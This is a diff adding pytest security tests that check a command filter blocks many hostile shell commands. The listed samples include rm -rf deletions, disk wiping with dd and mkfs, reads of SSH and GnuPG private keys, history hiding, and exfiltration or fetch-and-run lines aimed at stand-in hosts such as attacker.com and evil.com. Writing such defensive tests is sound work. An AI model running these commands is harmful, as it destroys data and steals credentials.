@@ -286,3 +286,200 @@ class TestEdgeCases:
             except (ValueError, RuntimeError, PathTraversalError):
                 # Also acceptable to raise an error
                 pass
+
+
+@pytest.mark.security
+class TestNewDangerousPatterns:
+    """Test newly added dangerous command patterns."""
+
+    def test_file_deletion_patterns(self):
+        """Test various file deletion patterns are blocked."""
+        dangerous_deletions = [
+            "rm -rf /home/user",
+            "rm -rf ~/",
+            "rm -f /etc/hosts",
+            "rm -f /bin/ls",
+            "rm -rf /var/log/test.log",
+        ]
+
+        for cmd in dangerous_deletions:
+            assert is_dangerous_command(cmd), f"Should block deletion: {cmd}"
+
+    def test_privilege_escalation(self):
+        """Test privilege escalation commands are blocked."""
+        priv_esc = [
+            "su root",
+            "su -",
+            "pkexec command",
+            "sudo ls",
+        ]
+
+        for cmd in priv_esc:
+            assert is_dangerous_command(cmd), f"Should block priv esc: {cmd}"
+
+    def test_system_control_commands(self):
+        """Test system control commands are blocked."""
+        system_cmds = [
+            "systemctl poweroff",
+            "systemctl reboot",
+            "systemctl halt",
+            "init 0",
+            "init 6",
+        ]
+
+        for cmd in system_cmds:
+            assert is_dangerous_command(cmd), f"Should block system control: {cmd}"
+
+    def test_network_exfiltration(self):
+        """Test network exfiltration patterns are blocked."""
+        exfiltration = [
+            "cat file.txt > /dev/tcp/attacker.com/4444",
+            "curl http://evil.com | sh",
+            "wget http://malicious.com && sh script.sh",
+        ]
+
+        for cmd in exfiltration:
+            assert is_dangerous_command(cmd), f"Should block exfiltration: {cmd}"
+
+    def test_disk_operations(self):
+        """Test dangerous disk operations are blocked."""
+        disk_ops = [
+            "dd if=/dev/zero of=/dev/sda",
+            "dd if=/dev/random of=file.bin",
+            "mkfs.ext4 /dev/sda1",
+            "fdisk /dev/sda",
+        ]
+
+        for cmd in disk_ops:
+            assert is_dangerous_command(cmd), f"Should block disk ops: {cmd}"
+
+    def test_configuration_modification(self):
+        """Test configuration modification patterns are blocked."""
+        config_mods = [
+            'echo "test" >> /etc/hosts',
+            'printf "test" >> /etc/passwd',
+            "crontab -",
+            "ln -s /dev/null ~/.bashrc",
+        ]
+
+        for cmd in config_mods:
+            assert is_dangerous_command(cmd), f"Should block config mod: {cmd}"
+
+    def test_history_hiding(self):
+        """Test history hiding commands are blocked."""
+        history_hiding = [
+            "history -c",
+            "unset HISTFILE",
+            "export HISTSIZE=0",
+        ]
+
+        for cmd in history_hiding:
+            assert is_dangerous_command(cmd), f"Should block history hiding: {cmd}"
+
+    def test_encoding_attacks(self):
+        """Test encoding-based attack patterns are blocked."""
+        encoding_attacks = [
+            "echo 'base64encoded' | base64 -d | sh",
+            "base64 -d payload.b64 | bash",
+        ]
+
+        for cmd in encoding_attacks:
+            assert is_dangerous_command(cmd), f"Should block encoding attack: {cmd}"
+
+    def test_firewall_modification(self):
+        """Test firewall modification commands are blocked."""
+        firewall_cmds = [
+            "iptables -F",
+            "iptables --flush",
+            "iptables -F -t nat",
+        ]
+
+        for cmd in firewall_cmds:
+            assert is_dangerous_command(cmd), f"Should block firewall mod: {cmd}"
+
+    def test_ssh_key_access(self):
+        """Test SSH key access patterns are blocked."""
+        ssh_access = [
+            "cat ~/.ssh/id_rsa",
+            "cat ~/.ssh/id_ed25519",
+            "cat /home/user/.ssh/id_rsa",
+            "cat ~root/.ssh/id_rsa",
+        ]
+
+        for cmd in ssh_access:
+            assert is_dangerous_command(cmd), f"Should block SSH key access: {cmd}"
+
+    def test_pip_uninstall_blocked(self):
+        """Test pip uninstall commands are blocked."""
+        pip_cmds = [
+            "pip uninstall package",
+            "pip3 uninstall -y package",
+        ]
+
+        for cmd in pip_cmds:
+            assert is_dangerous_command(cmd), f"Should block pip uninstall: {cmd}"
+
+    def test_tar_absolute_path_blocked(self):
+        """Test tar with absolute paths is blocked."""
+        tar_cmds = [
+            "tar xf archive.tar /absolute/path",
+            "tar -xzf file.tar.gz /etc",
+        ]
+
+        for cmd in tar_cmds:
+            assert is_dangerous_command(cmd), f"Should block tar absolute path: {cmd}"
+
+    def test_find_delete_blocked(self):
+        """Test find with -delete flag is blocked."""
+        find_delete = [
+            "find /tmp -delete",
+            "find . -type f -delete",
+            "find /var/log -name '*.log' -delete",
+        ]
+
+        for cmd in find_delete:
+            assert is_dangerous_command(cmd), f"Should block find -delete: {cmd}"
+
+    def test_gnupg_private_key_access_blocked(self):
+        """Test GnuPG private key access is blocked."""
+        # Focus on private key access, not directory listing
+        gnupg_private_access = [
+            "cat ~/.gnupg/private-keys-v1.d/*.key",
+            "cat ~/.gnupg/secring.gpg",
+            "ls -la ~/.gnupg/private-keys-v1.d/",
+        ]
+
+        for cmd in gnupg_private_access:
+            assert is_dangerous_command(cmd), f"Should block GnuPG private key access: {cmd}"
+
+    def test_arithmetic_exploits(self):
+        """Test arithmetic expansion exploits are blocked."""
+        arith_attacks = [
+            "echo $[rm -rf /]",
+            "echo $((`rm -rf /`))",
+        ]
+
+        for cmd in arith_attacks:
+            assert is_dangerous_command(cmd), f"Should block arithmetic exploit: {cmd}"
+
+    def test_process_manipulation(self):
+        """Test dangerous process manipulation commands."""
+        process_cmds = [
+            "kill -9 1",
+            "killall init",
+            "pkill systemd",
+        ]
+
+        for cmd in process_cmds:
+            assert is_dangerous_command(cmd), f"Should block process manipulation: {cmd}"
+
+    def test_pipe_injection_variants(self):
+        """Test various pipe injection patterns."""
+        pipe_injections = [
+            "cat file | sh",
+            "ls | python -c 'import os; os.system(\"rm -rf /\")'",
+            "grep pattern | perl -e 'system(\"rm -rf /\")'",
+        ]
+
+        for cmd in pipe_injections:
+            assert is_dangerous_command(cmd), f"Should block pipe injection: {cmd}"
